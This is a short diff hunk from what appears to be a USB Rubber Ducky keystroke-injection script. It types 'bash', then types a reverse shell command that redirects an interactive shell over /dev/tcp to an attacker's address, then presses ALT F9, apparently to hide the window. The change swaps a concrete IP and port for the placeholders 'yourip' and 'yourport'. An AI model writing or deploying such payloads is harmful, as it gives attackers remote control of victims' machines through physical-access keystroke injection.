@@ -11,7 +11,7 @@ DELAY 1000
 STRING bash            
 ENTER
 DELAY 500
-STRING sh -i >& /dev/tcp/10.10.10.10/9001 0>&1 // Reverse shell command
+STRING sh -i >& /dev/tcp/yourip/yourport 0>&1 // Reverse shell command
 ENTER
 DELAY 500
 ALT F9                
